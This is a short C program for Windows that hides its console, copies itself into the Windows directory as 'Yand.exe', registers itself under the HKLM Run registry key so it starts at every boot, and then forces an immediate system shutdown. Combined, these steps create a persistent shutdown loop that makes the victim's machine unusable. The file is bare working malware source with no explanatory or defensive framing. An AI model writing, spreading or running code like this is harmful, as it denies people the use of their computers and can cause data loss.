#include <windows.h>

#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)

BOOL SelfAutorun() {
    HKEY hKey = NULL;
    LONG lResult = 0;
    TCHAR szExeName[MAX_PATH + 1];
    TCHAR szWinPath[MAX_PATH + 1];
    GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
    GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
    lstrcat(szWinPath, L"\\Yand.exe");
    if (0 == CopyFile(szExeName, szWinPath, FALSE)) {
        return FALSE;
    }
    lResult = RegOpenKey(
        HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey);
    if (ERROR_SUCCESS != lResult) {
        return false;
    }
    RegSetValueEx(hKey, L"Yand", 0, REG_SZ, (PBYTE)szWinPath,
        lstrlen(szWinPath) * sizeof(TCHAR) + 1);
    RegCloseKey(hKey);
    return true;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SelfAutorun();
    WinExec("shutdown -s -t 0", SW_HIDE);
    return 0;
}
